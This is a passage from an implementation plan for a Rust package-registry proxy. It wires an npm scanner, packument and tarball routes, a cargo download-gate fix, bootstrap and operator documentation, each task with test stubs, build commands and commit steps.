- Consumes: Tasks 2, 3, 5, 8; `AdvisoryStore`, `VerdictStore`, `AiReviewer`, `ScanCoordinator`, `Policy`, `ConfigHandle`, `crate::advisory::matching_semver::affects`, `crate::scan::is_allowlisted`.
- Produces:
  - `pub enum NpmIndexDecision { Packument(serde_json::Value), NotFound, InProgress }`
  - `pub struct NpmScanner` with `pub fn new(upstream: NpmUpstream, advisory_store: AdvisoryStore, verdict_store: VerdictStore, policy: Arc<Policy>, ai_reviewer: Option<Arc<AiReviewer>>, config: Arc<ConfigHandle>, coordinator: Arc<ScanCoordinator>, artifact_cache: Arc<ArtifactCache>) -> Self`
  - `pub async fn decide_packument(&self, package: &str) -> NpmIndexDecision`
  - `pub fn fingerprint(&self) -> String`
  - `pub fn artifact_key(normalized: &str, name: &str, version: &str, digest: &DeclaredDigest) -> ArtifactKey` — `ecosystem: "npm"`, `package: normalized`, `version`, `filename: "{unscoped}-{version}.tgz"`, `sha256: digest.hex`. One definition, shared with Task 11 exactly as `cargo::artifact_key` is.
  - `pub async fn approved_for_download(&self, name: &str, version: &str) -> DownloadApproval` and `pub enum DownloadApproval { Approved { key: ArtifactKey, dist: Dist }, Refused(RefusalReason, Option<String>), NotApproved, NotFound, Unverifiable(RefusalReason) }` — the metadata-approval query Task 11's handler gates on. `NotApproved` means "no stored pass for this version", which is a refusal at the download, never an inline review.

Advisory lookup reads ecosystem `"npm"`. The release-age gate reads the packument's own `time` map against `NpmRegistryConfig::min_release_age_days`, keeping the established best-effort semantics: a version with no usable timestamp is not blocked on age. The whole cascade draws on one deadline from `NpmRegistryConfig::scan_budget`, held inline; exhaustion yields `InProgress`. With no `ai_reviewer` configured, every unreviewed version is locally marked review-failed so the cascade asks for no review it cannot run — which, with no fast path, means nothing is forwardable.

- [x] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn a_never_seen_package_forwards_its_newest_clean_version() {}
#[tokio::test] async fn one_passing_version_per_major_line_reaches_the_packument() {}
#[tokio::test] async fn the_cascade_moves_past_a_version_that_fails_review() {}
#[tokio::test] async fn a_cve_blocked_version_is_absent_from_the_forwarded_packument() {}
#[tokio::test] async fn a_version_published_too_recently_is_absent_under_a_seven_day_gate() {}
#[tokio::test] async fn a_version_with_no_publish_time_is_not_blocked_on_age() {}
#[tokio::test] async fn an_allowlisted_version_is_forwarded_without_any_review() {}
#[tokio::test] async fn forwarded_tarball_urls_all_point_at_the_proxy() {}
#[tokio::test] async fn dist_tags_latest_always_names_a_forwarded_version() {}
#[tokio::test] async fn a_missing_package_upstream_is_not_found_not_an_empty_packument() {}
#[tokio::test] async fn the_cascade_returns_in_progress_rather_than_hanging_past_its_budget() {}
#[tokio::test] async fn two_concurrent_requests_for_the_same_candidate_review_it_once() {}
#[tokio::test] async fn with_no_reviewer_configured_nothing_is_forwardable() {
    // the honest consequence of no fast path
}
#[tokio::test] async fn an_advisory_lookup_failure_forwards_nothing_rather_than_failing_open() {}
#[tokio::test] async fn approved_for_download_refuses_a_version_the_packument_gate_never_passed() {}
#[tokio::test] async fn approved_for_download_approves_a_stored_clean_version() {}
#[tokio::test] async fn approved_for_download_returns_the_stored_block_and_its_why_id() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test scan_npm`
Expected: FAIL to compile.

- [x] **Step 3: Implement `NpmScanner`**

Follow `scan/cargo.rs`'s structure: a `Facts` struct fetched in one blocking-pool call, a loop that hands `NpmCascadeInput` to `plan_npm_cascade` and reviews the named candidate, and `review_one` deduplicated through the `ScanCoordinator` with a `FinishGuard` first and only durably-stored verdicts broadcast to joiners. Review needs the tarball, so a candidate is downloaded via `download_tarball`, verified, unpacked with `crate::plugin::unpack`, and handed to `AiReviewer::review`. Every field is `Arc` so a clone can move into a detached review task.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test scan_npm`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/scan/npm.rs src/scan/mod.rs tests/scan_npm.rs
git commit -m "feat(npm): wire the cascade against advisories, the age gate and AI review"
```

---

### Task 10: The packument route and the npm router

**Status: DONE** (commits `cbd9562`). All steps complete; the task's own gate (`cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --no-fail-fast`) passed before its commit.

**Files:**
- Create: `src/http/npm_packument.rs`
- Modify: `src/http/mod.rs`
- Test: `tests/http_npm_packument.rs`

**Interfaces:**
- Consumes: Task 9's `NpmScanner`/`NpmIndexDecision`, Task 4's config.
- Produces:
  - `pub struct NpmAppState { pub npm_scanner: Arc<NpmScanner>, pub config: Arc<ConfigHandle>, pub upstream: Arc<NpmUpstream>, pub verdicts: Arc<VerdictStore>, pub plugins: Arc<PluginRunner>, pub artifact_cache: Arc<ArtifactCache>, pub reviews: Arc<ReviewStore>, pub plugin_run_coordinator: Arc<ScanCoordinator> }` — `Clone`.
  - `pub fn npm_router(state: NpmAppState) -> Router` — routes: `/-/ping`, `/-/npm/v1/security/advisories/bulk` and `/-/npm/v1/security/audits/quick` (both 404), `/refusals`, `/why/{id}`, `/api/reviews`, `/healthz`, the tarball route (Task 11), and the `/{*path}` packument catch-all last.
  - `pub async fn npm_packument_handler(State<NpmAppState>, Path<String>) -> Response`
  - `pub const NPM_ECOSYSTEM: &str = "npm";`

The aux routes are thin extractors over `refusals_for`, `why_for` and `reviews_for`, exactly as `cargo_index.rs` does. A packument path arrives percent-decoded by axum, so `@babel%2fcore` reaches the handler as `@babel/core` and goes straight to `validate_name`.

- [x] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn a_packument_request_serves_the_filtered_document() {}
#[tokio::test] async fn a_scoped_packument_path_resolves() { /* GET /@babel%2fcore */ }
#[tokio::test] async fn an_invalid_package_name_is_a_400_and_never_reaches_upstream() {}
#[tokio::test] async fn an_unknown_package_is_a_404() {}
#[tokio::test] async fn a_budget_exhausted_cascade_answers_retryable() {}
#[tokio::test] async fn the_audit_endpoints_answer_404_and_never_reach_upstream() {
    // both bulk and quick; assert zero upstream hits -- the org's dependency
    // tree must not be shipped to the public registry
}
#[tokio::test] async fn ping_answers_success() {}
#[tokio::test] async fn healthz_refusals_why_and_api_reviews_all_resolve_on_this_router() {}
#[tokio::test] async fn the_tarball_route_wins_over_the_packument_catch_all() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test http_npm_packument`
Expected: FAIL to compile.

- [x] **Step 3: Implement the state, the router and the handlers**

`matchit` resolves static segments before the wildcard, so the `/-/` routes and the tarball route are reachable alongside `/{*path}`; the tests above pin that.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test http_npm_packument`
Expected: PASS.

- [x] **Step 5: Verify a real `npm` accepts the full packument**

The spec's one load-bearing assumption: npm asks for the abbreviated form, and this proxy always answers with the full one. No unit test can settle that — it needs the real client. Serve this router on a loopback port against a `wiremock` upstream and run a real `npm`:

```bash
npm --registry http://127.0.0.1:<port>/ view lodash version
npm --registry http://127.0.0.1:<port>/ install lodash --no-audit --no-fund --dry-run
```

Expected: both succeed. If `npm` rejects or mis-parses the full document, stop and report it — the fix is to project the filtered document down to the abbreviated shape when the request asked for it, which is a real addition to Task 3's `filter_packument` and must not be guessed at silently. Record the npm version tested in the commit body either way.

- [x] **Step 6: Commit**

```bash
git add src/http/npm_packument.rs src/http/mod.rs tests/http_npm_packument.rs
git commit -m "feat(http): serve the npm packument, gated on the cascade"
```

---

### Task 11: The tarball route — metadata approval, then plugins

**Status: DONE** (commit `830b8d1`). Verified in-tree: `cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, and `cargo test --no-fail-fast` all clean (39 suites).

**Route deviation, approved by the operator.** The plan's route `/{*name}/-/{file}` is not registerable: `matchit` 0.8 (which axum 0.8 uses) rejects a catch-all that is not the final segment ("Catch-all parameters are only allowed at the end of a route"), and `/{name}/-/{file}` conflicts with the existing `/{*path}`. The tarball is therefore dispatched from the one catch-all: `npm_packument_handler` checks `npm_download::looks_like_tarball` first and hands the path to `npm_download::npm_download_handler`. Externally identical for every case below, including the scoped-path Review Focus case.

**Files:**
- Create: `src/http/npm_download.rs`
- Modify: `src/http/mod.rs`, `src/http/npm_packument.rs` (register the route)
- Test: `tests/http_npm_download.rs`

**Interfaces:**
- Consumes: Task 9's `approved_for_download`/`DownloadApproval`/`artifact_key`, Task 10's `NpmAppState`.
- Produces: `pub async fn npm_download_handler(State<NpmAppState>, Path<(String, String)>) -> Response`, registered at `/{*name}/-/{file}` so a scoped name's literal slash routes.

Order of operations, and the design's load-bearing constraint: resolve the name and version from the path, then call `approved_for_download`. Only `Approved` proceeds. `NotApproved` is a refusal — the download path never reviews inline. An approved artifact then goes through the plugin gate, deduplicated by digest through `plugin_run_coordinator` with a `FinishGuard` first, exactly as `cargo_download.rs` does; an artifact already marked plugin-checked serves its verified bytes directly.

- [x] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn an_approved_artifact_passes_the_plugins_and_is_served() {}
#[tokio::test] async fn a_version_the_packument_gate_never_approved_is_refused_without_a_download() {
    // THE constraint: assert zero upstream tarball hits and zero plugin runs
}
#[tokio::test] async fn a_failing_plugin_refuses_with_a_reason_phrase_and_a_why_link() {}
#[tokio::test] async fn a_stored_block_is_refused_without_contacting_upstream() {}
#[tokio::test] async fn an_already_plugin_checked_artifact_is_served_without_rerunning_plugins() {}
#[tokio::test] async fn a_digest_mismatch_is_refused_even_for_an_approved_version() {}
#[tokio::test] async fn two_concurrent_first_downloads_run_the_plugin_set_once_between_them() {}
#[tokio::test] async fn a_scoped_package_tarball_path_routes_and_is_served() {
    // Review Focus: GET /@babel/core/-/core-7.0.0.tgz, literal slash, must not 400
}
#[tokio::test] async fn a_tarball_filename_that_does_not_match_its_package_is_a_400() {}
#[tokio::test] async fn a_path_traversal_in_the_tarball_filename_is_a_400() {}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test http_npm_download`
Expected: FAIL to compile.

- [x] **Step 3: Implement the handler**

The version comes from the tarball filename, which must be exactly `{unscoped}-{version}.tgz` for the requested package; anything else is a 400 rather than a guess. The filename is never used as a path.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test http_npm_download`
Expected: PASS.

- [x] **Step 5: Commit**

```bash
git add src/http/npm_download.rs src/http/mod.rs src/http/npm_packument.rs tests/http_npm_download.rs
git commit -m "feat(http): gate the npm tarball on metadata approval and org plugins"
```

---

### Task 12: Close the same hole on the cargo download path

**Status: DONE** (commit `b80c701`). Verified in-tree: `cargo fmt --all --check`, `cargo clippy --all-targets -- -D warnings`, and 47 tests across `http_cargo_download`, `http_cargo_bootstrap`, `scan_cargo`, `http_cargo_index` all clean. Implementation notes beyond the plan's letter:

- `CargoDownloadApproval` keeps `Unverifiable` distinct from `NotApproved`, so an index outage answers 503 `unverifiable:upstream` rather than claiming the version was never admitted. Both still refuse.
- Exactly one index read per request: the allowlist branch fetches it itself, every other branch goes through `approved_for_download`.
- Two existing download tests (`a_hash_mismatch_is_refused_and_nothing_is_stored`, `a_plugin_that_could_not_run_is_a_503_not_a_stored_block`) assert that nothing is stored, so seeding an index-gate verdict would have made them vacuous. They now run through the allowlist override, which reaches the integrity check and plugin gate with no stored verdict.
- `tests/http_cargo_bootstrap.rs` needed no change: its happy path already exercises the real cascade, which stores `Clean` before the download.

`cargo_download_handler`'s `Ok(None) => {}` arm falls through to `serve_gated(.., true)`, serving a version with no stored verdict on plugin-pass alone — never CVE-filtered, age-checked, or AI-reviewed. The spec requires this closed in both ecosystems.

**Files:**
- Modify: `src/http/cargo_download.rs:144-168`, `src/scan/cargo.rs` (add the approval query)
- Test: `tests/http_cargo_download.rs`
- Modify: `docs/operations.md`

**Interfaces:**
- Produces: `CargoScanner::approved_for_download(&self, name: &str, version: &str) -> CargoDownloadApproval`, with its own enum in `scan/cargo.rs` whose `Approved` variant carries `{ key: ArtifactKey, entry: CargoIndexEntry }`. Deliberately **not** the same type as Task 9's `DownloadApproval`: the approved variant carries an ecosystem-specific payload (`CargoIndexEntry` here, npm's `Dist` there), so one shared enum would need a generic or an untyped field for no gain. The two are parallel by design, and the *gate order* is what has to match, not the type.

- [x] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn a_version_the_index_cascade_never_approved_is_refused_without_a_download() {
    // no stored verdict: assert 403-or-refusal, zero upstream download hits, zero plugin runs
}
#[tokio::test] async fn an_index_approved_version_still_runs_the_plugins_and_is_served() {
    // the existing happy path must keep working
}
#[tokio::test] async fn an_allowlisted_version_is_still_served_without_a_stored_verdict() {
    // the allowlist override survives this change
}
```

- [x] **Step 2: Run to verify failure**

Run: `cargo test --test http_cargo_download`
Expected: the first test FAILS — the artifact is currently downloaded and served.

- [x] **Step 3: Require metadata approval before the plugin gate**

Replace the fall-through so only an allowlisted version or one with a stored `Clean` verdict reaches `serve_with_plugin_dedup`. A version with no stored verdict is refused with a reason naming that it was never admitted by the index gate.

- [x] **Step 4: Run to verify pass**

Run: `cargo test --test http_cargo_download --test http_cargo_bootstrap --test scan_cargo`
Expected: PASS. A bootstrap test that relied on the old fall-through needs its fixture to seed an index-gate pass first; that is a fixture fix, not a behaviour concession.

- [x] **Step 5: Document the behaviour change and commit**

Add a note to `docs/operations.md` under the cargo deployment: a `.crate` download for a version the index gate never admitted is now refused rather than plugin-gated and served, and why.

```bash
git add src/http/cargo_download.rs src/scan/cargo.rs tests/http_cargo_download.rs tests/http_cargo_bootstrap.rs docs/operations.md
git commit -m "fix(cargo): require index-gate approval before serving a .crate"
```

---

### Task 13: Bootstrap and the three-way startup dispatch

**Files:**
- Create: `src/http/npm_bootstrap.rs`
- Modify: `src/http/mod.rs`, `src/main.rs`
- Test: `tests/http_npm_bootstrap.rs`

**Interfaces:**
- Consumes: Tasks 4, 9, 10, 11.
- Produces:
  - `pub struct NpmWired { pub router: Router, pub state: NpmAppState, pub db: Db }`

The cargo deployment needs two ecosystem constants because the OSV feed spells its ecosystem `crates.io` while verdicts are stored under `cargo`. npm has no such split — the feed and the stored ecosystem are both `npm` — so Task 10's `NPM_ECOSYSTEM` is the only constant, and this module reuses it rather than adding a second name for the same value.
  - `pub async fn bootstrap_npm(config: Config) -> anyhow::Result<NpmWired>`
  - `pub async fn bootstrap_npm_with_sandbox_factory(config: Config, sandbox_factory: SandboxFactory) -> anyhow::Result<NpmWired>`
  - `main.rs` dispatches three ways on which ecosystem table is present, and spawns the npm advisory ticker (OSV's npm feed via the existing `OsvSync::sync_ecosystem`) plus the cache-eviction ticker.

Fail-closed, as the other two bootstraps are: the advisory mirror syncs before the listener binds. With no `[ai_review]` configured, startup logs an explicit `error!` naming that no version can be forwarded without a reviewer and **refuses to start** — serving a registry that can never answer is worse than a clear startup failure. (The spec left refuse-vs-warn open; refusing is the choice here.) A config with no ecosystem table is still the PyPI deployment, unchanged.

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn bootstrap_npm_serves_a_package_through_the_full_cascade() {
    // packument gate reviews and forwards; tarball gate runs the plugin once and serves
}
#[tokio::test] async fn bootstrap_npm_syncs_the_advisory_mirror_before_serving() {}
#[tokio::test] async fn bootstrap_npm_refuses_a_config_with_no_npm_registry_table() {}
#[tokio::test] async fn bootstrap_npm_refuses_a_config_with_no_ai_review_configured() {
    // error names that nothing could be forwarded without a reviewer
}
#[tokio::test] async fn an_npm_deployment_answers_healthz() {}
#[tokio::test] async fn an_npm_deployment_serves_api_reviews_behind_the_ai_gate() {}
#[tokio::test] async fn a_plugin_refusal_why_link_resolves() {}
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test --test http_npm_bootstrap`
Expected: FAIL to compile.

- [ ] **Step 3: Implement the bootstrap and the dispatch**

Follow `cargo_bootstrap.rs` closely, including its two-upstream-clients note and its sandbox-factory seam for tests. The npm path has no `Reloader`, so `main.rs` logs the same restart-only warning the cargo path does.

- [ ] **Step 4: Run to verify pass**

Run: `cargo test --test http_npm_bootstrap`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/http/npm_bootstrap.rs src/http/mod.rs src/main.rs tests/http_npm_bootstrap.rs
git commit -m "feat: wire a full npm registry deployment end to end"
```

---

### Task 14: Operator documentation

**Status: DONE** (commit `751dd94`). Verified in-tree: `cargo fmt --all --check`, `cargo clippy --all-targets -- -D warnings`, and `cargo test --no-fail-fast` all clean (24 suites, including `tests/config.rs`'s `load_parses_example_config`, which parses `config.example.toml`). Added to `docs/operations.md`: the "Running an npm deployment" section, the "The npm lockfile the proxy cannot see" section, a shared-digest note under "Integrity", an upgrade-costs-a-re-review note under the fingerprint discussion, and the npm thresholds in "A minimum release age". Added the commented `[npm_registry]` block to `config.example.toml`, with every default copied from `src/config.rs`.

**Files:**
- Modify: `docs/operations.md`, `config.example.toml`

- [x] **Step 1: Document the npm deployment**

A "Running an npm deployment" section mirroring the cargo one: the settings table with every default from `src/config.rs` (`upstream_registry_url`, `scan_budget`, `max_packument_bytes`, `min_release_age_days`), the `npm config set registry` developer setup, the two gates and which checks fire at each, that `advisory_source_url` must point at OSV's npm feed, and that `[ai_review]` is mandatory for this deployment because there is no fast path past review.

- [x] **Step 2: Document the `npm ci` limitation**

Under "Known defects, not yet fixed": a lockfile generated without the proxy pins `resolved` at the public registry, so `npm ci` fetches those tarballs directly and no gate applies; the proxy cannot intercept a request not sent to it, and the operational fix is regenerating lockfiles behind the proxy. Also note the converse — lockfiles made behind the proxy carry internal URLs and do not work outside the network.

- [x] **Step 3: Note the shared-digest and install-script changes**

That the artifact cache now holds sha1 and sha512 digests alongside sha256, and that the collector and prompt version bumps re-review every artifact in every ecosystem once, on first request after the upgrade.

- [x] **Step 4: Add the commented `[npm_registry]` block to `config.example.toml`**

- [x] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test --no-fail-fast`

```bash
git add docs/operations.md config.example.toml
git commit -m "docs: document the npm deployment and its known limitations"
```
